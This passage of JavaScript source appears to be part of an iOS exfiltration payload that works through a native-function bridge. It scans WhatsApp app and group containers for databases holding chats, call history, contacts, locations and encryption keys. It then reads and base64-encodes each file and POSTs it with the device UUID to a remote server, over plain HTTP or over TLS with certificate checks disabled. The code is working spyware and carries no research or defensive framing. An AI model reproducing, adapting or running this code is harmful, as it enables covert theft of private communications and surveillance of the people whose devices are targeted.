identifier,\n\t\t\t\t\t\t\tuuid: name,\n\t\t\t\t\t\t\tname: metadata.CFBundleName || metadata.CFBundleDisplayName || identifier\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"closedir\", waGroupDir);\n\t\t}\n\t}\n\t\n\t\n\t// Also get data containers from applicationState.db\n\tconst allBundleIds = getBundleIdLookup();\n\tconst whatsappBundleIds = [];\n\t\n\tfor (const bundleId of Object.keys(allBundleIds)) {\n\t\tif (bundleId === \"true\") continue;\n\t\tconst bundleIdLower = bundleId.toLowerCase();\n\t\tif (bundleIdLower.indexOf(\"whatsapp\") !== -1) {\n\t\t\twhatsappBundleIds.push(bundleId);\n\t\t}\n\t}\n\t\n\tconst waContainers = getContainerPathsForBundleIds(whatsappBundleIds);\n\t\n\t// Scan WhatsApp group containers first\n\tfor (const waGroup of whatsappGroupContainers) {\n\t\tconst files = listFilesRecursive(waGroup.groupPath, 10, 0);\n\t\t\n\t\t// WhatsApp specific database files to download\n\t\tconst whatsappDbNames = [\n\t\t\t\"AvatarSearchTags.sqlite\",\n\t\t\t\"Axolotl.sqlite\",\n\t\t\t\"BackedUpKeyValue.sqlite\",\n\t\t\t\"CallHistory.sqlite\",\n\t\t\t\"ChatStorage.sqlite\",\n\t\t\t\"Contacts.sqlite\",\n\t\t\t\"ContactsV2.sqlite\",\n\t\t\t\"DeviceAgents.sqlite\",\n\t\t\t\"emoji.sqlite\",\n\t\t\t\"Labels.sqlite\",\n\t\t\t\"LID.sqlite\",\n\t\t\t\"LocalKeyValue.sqlite\",\n\t\t\t\"Location.sqlite\",\n\t\t\t\"MediaDomain.sqlite\",\n\t\t\t\"Sticker.sqlite\",\n\t\t\t\"Stickers.sqlite\"\n\t\t];\n\t\t\n\t\tlet sqliteCount = 0;\n\t\tfor (const file of files) {\n\t\t\tif (file.size > 100 * 1024 * 1024) continue;\n\t\t\tif (file.size === 0) continue;\n\t\t\t\n\t\t\tconst fileName = file.path.split('/').pop();\n\t\t\t\n\t\t\t// Check if this is one of the WhatsApp databases we want\n\t\t\tlet isWhatsAppDb = false;\n\t\t\tfor (const dbName of whatsappDbNames) {\n\t\t\t\tif (fileName === dbName) {\n\t\t\t\t\tisWhatsAppDb = true;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tif (!isWhatsAppDb) continue;\n\t\t\t\n\t\t\tsqliteCount++;\n\t\t\t\n\t\t\tmessengerFiles.push({\n\t\t\t\tpath: file.path,\n\t\t\t\tfilename: getUniqueFilename(file.path),\n\t\t\t\tcategory: \"whatsapp\",\n\t\t\t\tdescription: \"WhatsApp - \" + waGroup.name\n\t\t\t});\n\t\t}\n\t\t\n\t}\n\t\n\t// Log what data containers were found\n\tfor (const bid of Object.keys(waContainers)) {\n\t\tconst c = waContainers[bid];\n\t}\n\t\n\t// Scan WhatsApp data containers\n\tfor (const bundleId of Object.keys(waContainers)) {\n\t\tconst container = waContainers[bundleId];\n\t\tconst appName = container.name || bundleId;\n\t\t\n\t\tif (true) {\n\t\t\t// WhatsApp: scan specific subdirectories known to contain databases\n\t\t\t\n\t\t\tif (container.dataPath) {\n\t\t\t\tconst dirsToScan = [\n\t\t\t\t\tcontainer.dataPath + \"/Documents\",\n\t\t\t\t\tcontainer.dataPath + \"/Library\",\n\t\t\t\t\tcontainer.dataPath + \"/Library/Application Support\",\n\t\t\t\t\tcontainer.dataPath + \"/Library/ChatStorage\",\n\t\t\t\t\tcontainer.dataPath + \"/tmp\"\n\t\t\t\t];\n\t\t\t\t\n\t\t\t\tfor (const dir of dirsToScan) {\n\t\t\t\t\tconst files = listFilesRecursive(dir, 10, 0);\n\t\t\t\t\t\n\t\t\t\t// WhatsApp specific database files to download\n\t\t\t\tconst whatsappDbNames = [\n\t\t\t\t\t\"AvatarSearchTags.sqlite\",\n\t\t\t\t\t\"Axolotl.sqlite\",\n\t\t\t\t\t\"BackedUpKeyValue.sqlite\",\n\t\t\t\t\t\"CallHistory.sqlite\",\n\t\t\t\t\t\"ChatStorage.sqlite\",\n\t\t\t\t\t\"Contacts.sqlite\",\n\t\t\t\t\t\"ContactsV2.sqlite\",\n\t\t\t\t\t\"DeviceAgents.sqlite\",\n\t\t\t\t\t\"emoji.sqlite\",\n\t\t\t\t\t\"Labels.sqlite\",\n\t\t\t\t\t\"LID.sqlite\",\n\t\t\t\t\t\"LocalKeyValue.sqlite\",\n\t\t\t\t\t\"Location.sqlite\",\n\t\t\t\t\t\"MediaDomain.sqlite\",\n\t\t\t\t\t\"Sticker.sqlite\",\n\t\t\t\t\t\"Stickers.sqlite\"\n\t\t\t\t];\n\t\t\t\t\n\t\t\t\tfor (const file of files) {\n\t\t\t\t\tif (file.size > 100 * 1024 * 1024) continue;\n\t\t\t\t\tif (file.size === 0) continue;\n\t\t\t\t\t\n\t\t\t\t\tconst fileName = file.path.split('/').pop();\n\t\t\t\t\t\n\t\t\t\t\t// Check if this is one of the WhatsApp databases we want\n\t\t\t\t\tlet isWhatsAppDb = false;\n\t\t\t\t\tfor (const dbName of whatsappDbNames) {\n\t\t\t\t\t\tif (fileName === dbName) {\n\t\t\t\t\t\t\tisWhatsAppDb = true;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tif (!isWhatsAppDb) {\n\t\t\t\t\t\tcontinue; // Skip non-WhatsApp databases\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\tmessengerFiles.push({\n\t\t\t\t\t\tpath: file.path,\n\t\t\t\t\t\tfilename: getUniqueFilename(file.path),\n\t\t\t\t\t\tcategory: \"whatsapp\",\n\t\t\t\t\t\tdescription: \"WhatsApp - \" + appName\n\t\t\t\t\t});\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\t\n\treturn messengerFiles;\n}\n\n/**\n * Base64 encode a Uint8Array\n */\nfunction base64Encode(data) {\n\tconst chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n\tlet result = \"\";\n\t\n\tfor (let i = 0; i < data.length; i += 3) {\n\t\tconst byte1 = data[i];\n\t\tconst byte2 = i + 1 < data.length ? data[i + 1] : 0;\n\t\tconst byte3 = i + 2 < data.length ? data[i + 2] : 0;\n\t\t\n\t\tconst b1 = byte1 >> 2;\n\t\tconst b2 = ((byte1 & 0x03) << 4) | (byte2 >> 4);\n\t\tconst b3 = ((byte2 & 0x0F) << 2) | (byte3 >> 6);\n\t\tconst b4 = byte3 & 0x3F;\n\t\t\n\t\tresult += chars[b1] + chars[b2];\n\t\tresult += (i + 1 < data.length) ? chars[b3] : \"=\";\n\t\tresult += (i + 2 < data.length) ? chars[b4] : \"=\";\n\t}\n\t\n\treturn result;\n}\n\n/**\n * Read a file and return its contents as base64\n */\nfunction readFileAsBase64(filePath) {\n\ttry {\n\t\t// Check if file exists\n\t\tif (!fileExists(filePath)) {\n\t\t\treturn null;\n\t\t}\n\t\t\n\t\t// Get file size\n\t\tconst fileSize = getFileSize(filePath);\n\t\tif (fileSize < 0) {\n\t\t\treturn null;\n\t\t}\n\t\t\n\t\tif (fileSize === 0) {\n\t\t\treturn { data: \"\", size: 0 };\n\t\t}\n\t\t\n\t\tif (fileSize > MAX_FILE_SIZE) {\n\t\t\treturn null;\n\t\t}\n\t\t\n\t\t// Open file for reading\n\t\tconst fd = Native.callSymbol(\"open\", filePath, 0); // O_RDONLY = 0\n\t\tif (Number(fd) < 0) {\n\t\t\treturn null;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\t// Read file in chunks\n\t\t\tlet fileData = new Uint8Array(0);\n\t\t\tlet totalRead = 0;\n\t\t\t\n\t\t\twhile (totalRead < fileSize) {\n\t\t\t\tconst remaining = fileSize - totalRead;\n\t\t\t\tconst toRead = remaining > CHUNK_SIZE ? CHUNK_SIZE : remaining;\n\t\t\t\t\n\t\t\t\tconst chunkBuf = Native.callSymbol(\"malloc\", BigInt(toRead));\n\t\t\t\tif (!chunkBuf || chunkBuf === 0n) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\ttry {\n\t\t\t\t\tconst bytesRead = Native.callSymbol(\"read\", fd, chunkBuf, toRead);\n\t\t\t\t\tconst bytesReadNum = Number(bytesRead);\n\t\t\t\t\t\n\t\t\t\t\tif (bytesReadNum <= 0) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t// Read data from the buffer\n\t\t\t\t\tconst chunkData = Native.read(chunkBuf, bytesReadNum);\n\t\t\t\t\tif (chunkData && chunkData.byteLength > 0) {\n\t\t\t\t\t\tconst chunkArray = new Uint8Array(chunkData);\n\t\t\t\t\t\t\n\t\t\t\t\t\t// Append to fileData\n\t\t\t\t\t\tconst newData = new Uint8Array(fileData.length + chunkArray.length);\n\t\t\t\t\t\tnewData.set(fileData, 0);\n\t\t\t\t\t\tnewData.set(chunkArray, fileData.length);\n\t\t\t\t\t\tfileData = newData;\n\t\t\t\t\t\t\n\t\t\t\t\t\ttotalRead += bytesReadNum;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t} finally {\n\t\t\t\t\tNative.callSymbol(\"free\", chunkBuf);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tif (fileData.length > 0) {\n\t\t\t\tconst base64Data = base64Encode(fileData);\n\t\t\t\treturn { data: base64Data, size: fileData.length };\n\t\t\t} else {\n\t\t\t\treturn null;\n\t\t\t}\n\t\t\t\n\t\t} finally {\n\t\t\tNative.callSymbol(\"close\", fd);\n\t\t}\n\t\t\n\t} catch (e) {\n\t\treturn null;\n\t}\n}\n\n/**\n * Send file data via HTTP POST\n */\nfunction sendFileViaHTTP(filePath, category, description, base64Data, originalSize, deviceUUID) {\n\ttry {\n\t\t\n\t\t// Create socket\n\t\tconst socket = Native.callSymbol(\"socket\", 2, 1, 0); // AF_INET, SOCK_STREAM, 0\n\t\tif (Number(socket) < 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t// Set up address structure\n\t\tconst addr = Native.mem;\n\t\tconst sockaddr = new ArrayBuffer(16);\n\t\tconst view = new DataView(sockaddr);\n\t\t\n\t\tview.setUint16(0, 2, true); // AF_INET\n\t\tconst port = Native.callSymbol(\"htons\", HTTP_PORT);\n\t\tview.setUint16(2, Number(port), true);\n\t\t\n\t\tconst hostStrPtr = Native.callSymbol(\"malloc\", BigInt(SERVER_HOST.length + 1));\n\t\tNative.writeString(hostStrPtr, SERVER_HOST);\n\t\tconst ipAddr = Native.callSymbol(\"inet_addr\", hostStrPtr);\n\t\tNative.callSymbol(\"free\", hostStrPtr);\n\t\t\n\t\tif (ipAddr === 0xFFFFFFFFn || ipAddr === -1n) {\n\t\t\tNative.callSymbol(\"close\", socket);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tview.setUint32(4, Number(ipAddr), true);\n\t\tNative.write(addr, sockaddr);\n\t\t\n\t\t// Connect to server\n\t\tconst connectResult = Native.callSymbol(\"connect\", socket, addr, 16);\n\t\tif (Number(connectResult) < 0) {\n\t\t\tNative.callSymbol(\"close\", socket);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t// Build JSON payload\n\t\tconst jsonData = JSON.stringify({\n\t\t\tpath: filePath,\n\t\t\tcategory: category,\n\t\t\tdescription: description,\n\t\t\tsize: originalSize,\n\t\t\tdeviceUUID: deviceUUID,\n\t\t\tdata: base64Data\n\t\t});\n\t\t\n\t\t// Prepare HTTP request\n\t\tconst httpRequest = `POST ${UPLOAD_PATH} HTTP/1.1\\r\\n` +\n\t\t\t\t\t\t   `Host: ${SERVER_HOST}:${HTTP_PORT}\\r\\n` +\n\t\t\t\t\t\t   `Content-Type: application/json\\r\\n` +\n\t\t\t\t\t\t   `Content-Length: ${jsonData.length}\\r\\n` +\n\t\t\t\t\t\t   `X-Device-UUID: ${deviceUUID}\\r\\n` +\n\t\t\t\t\t\t   `Connection: close\\r\\n\\r\\n` +\n\t\t\t\t\t\t   jsonData;\n\t\t\n\t\t// For large requests, we need to send in chunks\n\t\tconst requestBytes = Native.stringToBytes(httpRequest, false);\n\t\tconst requestLength = requestBytes.byteLength;\n\t\t\n\t\t// Allocate buffer for the request\n\t\tconst sendBufSize = Math.min(requestLength, 0x10000); // 64KB max per send\n\t\tconst sendBuf = Native.callSymbol(\"malloc\", BigInt(sendBufSize));\n\t\tif (!sendBuf || sendBuf === 0n) {\n\t\t\tNative.callSymbol(\"close\", socket);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\tlet totalSent = 0;\n\t\t\tconst requestArray = new Uint8Array(requestBytes);\n\t\t\t\n\t\t\twhile (totalSent < requestLength) {\n\t\t\t\tconst remaining = requestLength - totalSent;\n\t\t\t\tconst toSend = remaining > sendBufSize ? sendBufSize : remaining;\n\t\t\t\t\n\t\t\t\t// Copy chunk to buffer\n\t\t\t\tconst chunk = requestArray.slice(totalSent, totalSent + toSend);\n\t\t\t\tNative.write(sendBuf, chunk.buffer);\n\t\t\t\t\n\t\t\t\tconst sendResult = Native.callSymbol(\"send\", socket, sendBuf, toSend, 0);\n\t\t\t\tconst sendResultNum = Number(sendResult);\n\t\t\t\t\n\t\t\t\tif (sendResultNum < 0) {\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\ttotalSent += sendResultNum;\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t\t// Wait a bit before closing\n\t\t\tNative.callSymbol(\"usleep\", BigInt(50000)); // 50ms delay\n\t\t\t\n\t\t\treturn true;\n\t\t\t\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", sendBuf);\n\t\t\tNative.callSymbol(\"close\", socket);\n\t\t}\n\t\t\n\t} catch (error) {\n\t\treturn false;\n\t}\n}\n\n/**\n * Send file data via HTTPS POST using CFStream with TLS\n */\nfunction sendFileViaHTTPS(filePath, category, description, base64Data, originalSize, deviceUUID) {\n\ttry {\n\t\t\n\t\t// Helper function to safely read 64-bit value\n\t\tfunction safeRead64(addr) {\n\t\t\tconst bytes = Native.read(addr, 8);\n\t\t\tif (!bytes || bytes.byteLength < 8) return 0n;\n\t\t\tconst view = new DataView(bytes);\n\t\t\tconst low = BigInt(view.getUint32(0, true));\n\t\t\tconst high = BigInt(view.getUint32(4, true));\n\t\t\treturn (high << 32n) | low;\n\t\t}\n\t\t\n\t\t// Helper function to safely write 64-bit value\n\t\tfunction safeWrite64(addr, value) {\n\t\t\tconst buffer = new ArrayBuffer(8);\n\t\t\tconst view = new DataView(buffer);\n\t\t\tconst bigValue = BigInt(value);\n\t\t\tview.setUint32(0, Number(bigValue & 0xFFFFFFFFn), true);\n\t\t\tview.setUint32(4, Number((bigValue >> 32n) & 0xFFFFFFFFn), true);\n\t\t\tNative.write(addr, buffer);\n\t\t}\n\t\t\n\t\t// Create CFString for host\n\t\tconst hostCStr = Native.callSymbol(\"malloc\", SERVER_HOST.length + 1);\n\t\tNative.writeString(hostCStr, SERVER_HOST);\n\t\tconst hostCFString = Native.callSymbol(\"CFStringCreateWithCString\", 0n, hostCStr, 0x08000100);\n\t\tNative.callSymbol(\"free\", hostCStr);\n\t\t\n\t\tif (!hostCFString || hostCFString === 0n) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t// Allocate space for read/write stream pointers\n\t\tconst readStreamPtr = Native.callSymbol(\"malloc\", 8);\n\t\tconst writeStreamPtr = Native.callSymbol(\"malloc\", 8);\n\t\tsafeWrite64(readStreamPtr, 0n);\n\t\tsafeWrite64(writeStreamPtr, 0n);\n\t\t\n\t\t// Create stream pair connected to host:port\n\t\tNative.callSymbol(\"CFStreamCreatePairWithSocketToHost\", 0n, hostCFString, HTTPS_PORT, readStreamPtr, writeStreamPtr);\n\t\t\n\t\tconst readStream = safeRead64(readStreamPtr);\n\t\tconst writeStream = safeRead64(writeStreamPtr);\n\t\t\n\t\tNative.callSymbol(\"CFRelease\", hostCFString);\n\t\tNative.callSymbol(\"free\", readStreamPtr);\n\t\tNative.callSymbol(\"free\", writeStreamPtr);\n\t\t\n\t\tif (!writeStream || writeStream === 0n) {\n\t\t\tif (readStream && readStream !== 0n) Native.callSymbol(\"CFRelease\", readStream);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t\n\t\t// Set up SSL/TLS\n\t\tconst securityLevelCStr = Native.callSymbol(\"malloc\", 64);\n\t\tNative.writeString(securityLevelCStr, \"kCFStreamPropertySocketSecurityLevel\");\n\t\tconst kCFStreamPropertySocketSecurityLevel = Native.callSymbol(\"CFStringCreateWithCString\", 0n, securityLevelCStr, 0x08000100);\n\t\tNative.callSymbol(\"free\", securityLevelCStr);\n\t\t\n\t\tconst sslNegotiatedCStr = Native.callSymbol(\"malloc\", 64);\n\t\tNative.writeString(sslNegotiatedCStr, \"kCFStreamSocketSecurityLevelNegotiatedSSL\");\n\t\tconst kCFStreamSocketSecurityLevelNegotiatedSSL = Native.callSymbol(\"CFStringCreateWithCString\", 0n, sslNegotiatedCStr, 0x08000100);\n\t\tNative.callSymbol(\"free\", sslNegotiatedCStr);\n\t\t\n\t\t// Set TLS/SSL on the streams\n\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", writeStream, kCFStreamPropertySocketSecurityLevel, kCFStreamSocketSecurityLevelNegotiatedSSL);\n\t\tNative.callSymbol(\"CFReadStreamSetProperty\", readStream, kCFStreamPropertySocketSecurityLevel, kCFStreamSocketSecurityLevelNegotiatedSSL);\n\t\t\n\t\t// Configure SSL settings to allow self-signed certificates\n\t\tconst sslSettingsCStr = Native.callSymbol(\"malloc\", 64);\n\t\tNative.writeString(sslSettingsCStr, \"kCFStreamPropertySSLSettings\");\n\t\tconst kCFStreamPropertySSLSettings = Native.callSymbol(\"CFStringCreateWithCString\", 0n, sslSettingsCStr, 0x08000100);\n\t\tNative.callSymbol(\"free\", sslSettingsCStr);\n\t\t\n\t\tconst validateCertCStr = Native.callSymbol(\"malloc\", 64);\n\t\tNative.writeString(validateCertCStr, \"kCFStreamSSLValidatesCertificateChain\");\n\t\tconst validateCertKey = Native.callSymbol(\"CFStringCreateWithCString\", 0n, validateCertCStr, 0x08000100);\n\t\tNative.callSymbol(\"free\", validateCertCStr);\n\t\t\n\t\t// Get kCFBooleanFalse to disable certificate validation\n\t\tconst kCFBooleanFalse = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFBooleanFalse\");\n\t\tconst kCFBooleanFalseValue = kCFBooleanFalse ? safeRead64(kCFBooleanFalse) : 0n;\n\t\t\n\t\tif (kCFBooleanFalseValue && kCFBooleanFalseValue !== 0n) {\n\t\t\tconst keysArray = Native.callSymbol(\"malloc\", 8);\n\t\t\tconst valuesArray = Native.callSymbol(\"malloc\", 8);\n\t\t\tsafeWrite64(keysArray, validateCertKey);\n\t\t\tsafeWrite64(valuesArray, kCFBooleanFalseValue);\n\t\t\t\n\t\t\tconst kCFTypeDictionaryKeyCallBacks = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryKeyCallBacks\");\n\t\t\tconst kCFTypeDictionaryValueCallBacks = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryValueCallBacks\");\n\t\t\t\n\t\t\tif (kCFTypeDictionaryKeyCallBacks && kCFTypeDictionaryValueCallBacks) {\n\t\t\t\tconst sslSettings = Native.callSymbol(\"CFDictionaryCreate\", 0n, keysArray, valuesArray, 1,\n\t\t\t\t\tkCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);\n\t\t\t\t\n\t\t\t\tif (sslSettings && sslSettings !== 0n) {\n\t\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", writeStream, kCFStreamPropertySSLSettings, sslSettings);\n\t\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\", readStream, kCFStreamPropertySSLSettings, sslSettings);\n\t\t\t\t\tNative.callSymbol(\"CFRelease\", sslSettings);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tNative.callSymbol(\"free\", keysArray);\n\t\t\tNative.callSymbol(\"free\", valuesArray);\n\t\t}\n\t\t\n\t\tif (validateCertKey) Native.callSymbol(\"CFRelease\", validateCertKey);\n\t\tif (kCFStreamPropertySocketSecurityLevel) Native.callSymbol(\"CFRelease\", kCFStreamPropertySocketSecurityLevel);\n\t\tif (kCFStreamSocketSecurityLevelNegotiatedSSL) Native.callSymbol(\"CFRelease\", kCFStreamSocketSecurityLevelNegotiatedSSL);\n\t\tif (kCFStreamPropertySSLSettings) Native.callSymbol(\"CFRelease\", kCFStreamPropertySSLSettings);\n\t\t\n\t\t// Open the streams\n\t\t\n\t\tNative.callSymbol(\"CFReadStreamOpen\", readStream);\n\t\tconst writeOpened = Native.callSymbol(\"CFWriteStreamOpen\", writeStream);\n\t\t\n\t\tif (!writeOpened) {\n\t\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t// Wait for stream to be ready (TLS handshake)\n\t\t\n\t\tlet attempts = 0;\n\t\tconst maxAttempts = 100; // 10 seconds max\n\t\tlet streamReady = false;\n\t\t\n\t\twhile (attempts < maxAttempts) {\n\t\t\tconst status = Number(Native.callSymbol(\"CFWriteStreamGetStatus\", writeStream));\n\t\t\t\n\t\t\tif (status === 2) { // kCFStreamStatusOpen\n\t\t\t\tstreamReady = true;\n\t\t\t\tbreak;\n\t\t\t} else if (status >= 5) { // Error states\n\t\t\t\tbreak;\n\t\t\t} else {\n\t\t\t\tNative.callSymbol(\"usleep\", 100000); // 100ms\n\t\t\t\tattempts++;\n\t\t\t}\n\t\t}\n\t\t\n\t\tif (!streamReady) {\n\t\t\tconst finalStatus = Number(Native.callSymbol(\"CFWriteStreamGetStatus\", writeStream));\n\t\t\tNative.callSymbol(\"CFReadStreamClose\", readStream);\n\t\t\tNative.callSymbol(\"CFWriteStreamClose\", writeStream);\n\t\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t\n\t\t// Build JSON payload\n\t\tconst jsonData = JSON.stringify({\n\t\t\tpath: filePath,\n\t\t\tcategory: category,\n\t\t\tdescription: description,\n\t\t\tsize: originalSize,\n\t\t\tdeviceUUID: deviceUUID,\n\t\t\tdata: base64Data\n\t\t});\n\t\t\n\t\t// Build HTTPS request\n\t\tconst httpRequest = `POST ${UPLOAD_PATH} HTTP/1.1\\r\\n` +\n\t\t\t\t\t\t   `Host: ${SERVER_HOST}:${HTTPS_PORT}\\r\\n` +\n\t\t\t\t\t\t   `Content-Type: application/json\\r\\n` +\n\t\t\t\t\t\t   `Content-Length: ${jsonData.length}\\r\\n` +\n\t\t\t\t\t\t   `X-Device-UUID: ${deviceUUID}\\r\\n` +\n\t\t\t\t\t\t   `Connection: close\\r\\n\\r\\n` +\n\t\t\t\t\t\t   jsonData;\n\t\t\n\t\t// Send request via CFWriteStream\n\t\tconst requestLen = httpRequest.length;\n\t\t\n\t\tconst requestBuf = Native.callSymbol(\"malloc\", requestLen + 1);\n\t\tif (!requestBuf || requestBuf === 0n) {\n\t\t\tNative.callSymbol(\"CFReadStreamClose\", readStream);\n\t\t\tNative.callSymbol(\"CFWriteStreamClose\", writeStream);\n\t\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\tconst requestBytes = Native.stringToBytes(httpRequest, false);\n\t\t\t\n\t\t\t// Send in chunks with timeout\n\t\t\tlet bytesSent = 0;\n\t\t\tconst sendChunkSize = 4096;\n\t\t\tlet waitLoops = 0;\n\t\t\tconst maxWaitLoops = 1000; // Max 10 seconds of waiting\n\t\t\t\n\t\t\twhile (bytesSent < requestLen && waitLoops < maxWaitLoops) {\n\t\t\t\tconst canWrite = Native.callSymbol(\"CFWriteStreamCanAcceptBytes\", writeStream);\n\t\t\t\tif (!canWrite) {\n\t\t\t\t\tNative.callSymbol(\"usleep\", 10000); // 10ms\n\t\t\t\t\twaitLoops++;\n\t\t\t\t\tif (waitLoops % 100 === 0) {\n\t\t\t\t\t}\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\twaitLoops = 0; // Reset on successful write opportunity\n\t\t\t\t\n\t\t\t\tconst remaining = requestLen - bytesSent;\n\t\t\t\tconst chunkSize = Math.min(remaining, sendChunkSize);\n\t\t\t\t\n\t\t\t\tconst chunkBuf = Native.callSymbol(\"malloc\", chunkSize);\n\t\t\t\tif (!chunkBuf || chunkBuf === 0n) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\ttry {\n\t\t\t\t\t// Copy chunk data\n\t\t\t\t\tconst chunkData = new Uint8Array(requestBytes, bytesSent, chunkSize);\n\t\t\t\t\tNative.write(chunkBuf, chunkData.buffer.slice(chunkData.byteOffset, chunkData.byteOffset + chunkData.byteLength));\n\t\t\t\t\t\n\t\t\t\t\tconst sendResult = Native.callSymbol(\"CFWriteStreamWrite\", writeStream, chunkBuf, chunkSize);\n\t\t\t\t\tif (Number(sendResult) < 0) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tbytesSent += Number(sendResult);\n\t\t\t\t\t\n\t\t\t\t\t// Log progress every 100KB\n\t\t\t\t\tif (bytesSent % 102400 < sendChunkSize) {\n\t\t\t\t\t}\n\t\t\t\t} finally {\n\t\t\t\t\tNative.callSymbol(\"free\", chunkBuf);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tif (waitLoops >= maxWaitLoops) {\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", requestBuf);\n\t\t}\n\t\t\n\t\t// Wait for and read server response before closing\n\t\tconst responseBuf = Native.callSymbol(\"malloc\", 1024);\n\t\tif (responseBuf && responseBuf !== 0n) {\n\t\t\ttry {\n\t\t\t\t// Wait for response with timeout\n\t\t\t\tlet waitCount = 0;\n\t\t\t\tconst maxWait = 50; // 500ms max wait\n\t\t\t\t\n\t\t\t\twhile (waitCount < maxWait) {\n\t\t\t\t\tconst hasBytes = Native.callSymbol(\"CFReadStreamHasBytesAvailable\", readStream);\n\t\t\t\t\tif (hasBytes) break;\n\t\t\t\t\tNative.callSymbol(\"usleep\", 10000); // 10ms\n\t\t\t\t\twaitCount++;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// Read response (we don't need to process it, just acknowledge)\n\t\t\t\tconst bytesRead = Native.callSymbol(\"CFReadStreamRead\", readStream, responseBuf, 1024);\n\t\t\t\tif (Number(bytesRead) > 0) {\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"free\", responseBuf);\n\t\t\t}\n\t\t}\n\t\t\n\t\t// Close streams\n\t\tNative.callSymbol(\"CFReadStreamClose\", readStream);\n\t\tNative.callSymbol(\"CFWriteStreamClose\", writeStream);\n\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\t\n\t\treturn true;\n\t\t\n\t} catch (error) {\n\t\treturn false;\n\t}\n}\n\n/**\n * Get current process name\n */\nfunction getProcessName() {\n\tlet processName = \"unknown\";\n\ttry {\n\t\tconst currentPid = Native.callSymbol(\"getpid\");\n\t\t\n\t\tconst nameBuffer = Native.callSymbol(\"malloc\", BigInt(256));\n\t\tif (nameBuffer !== 0n) {\n\t\t\tconst nameResult = Native.callSymbol(\"proc_name\", currentPid, nameBuffer, 256);\n\t\t\tif (nameResult === 0) {\n\t\t\t\tconst name = Native.readString(nameBuffer, 256).replace(/\\0/g, '').trim();\n\t\t\t\tif (name && name.length > 0) {\n\t\t\t\t\tprocessName = name;\n\t\t\t\t}\n\t\t\t}\n\t\t\tNative.callSymbol(\"free\", nameBuffer);\n\t\t}\n\t\t\n\t\tif (processName === \"unknown\") {\n\t\t\tconst pathBuffer = Native.callSymbol(\"malloc\", BigInt(1024));\n\t\t\tif (pathBuffer !== 0n) {\n\t\t\t\tconst pathResult = Native.callSymbol(\"proc_pidpath\", currentPid, pathBuffer, 1024);\n\t\t\t\tif (pathResult > 0) {\n\t\t\t\t\tconst fullPath = Native.readString(pathBuffer, 1024).replace(/\\0/g, '').trim();\n\t\t\t\t\tif (fullPath && fullPath.length > 0) {\n\t\t\t\t\t\tconst pathParts = fullPath.split('/');\n\t\t\t\t\t\tconst basename = pathParts[pathParts.length - 1];\n\t\t\t\t\t\tif (basename && basename.length > 0) {\n\t\t\t\t\t\t\tprocessName = basename;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tNative.callSymbol(\"free\", pathBuffer);\n\t\t\t}\n\t\t}\n\t} catch (e) {\n\t\t// Ignore errors\n\t}\n\t\n\treturn processName;\n}\n\n// ============================================================================\n// Main Execution\n// ============================================================================\n\ntry {\n\t\n\tconst processName = getProcessName();\n\tconst currentPid = Native.callSymbol(\"getpid\");\n\tconst deviceUUID = getDeviceUUID();\n\t\n\t\n\tlet successCount = 0;\n\tlet failCount = 0;\n\tlet skipCount = 0;\n\t\n\tfor (let i = 0; i < FORENSIC_FILES.length; i++) {\n\t\tconst fileInfo = 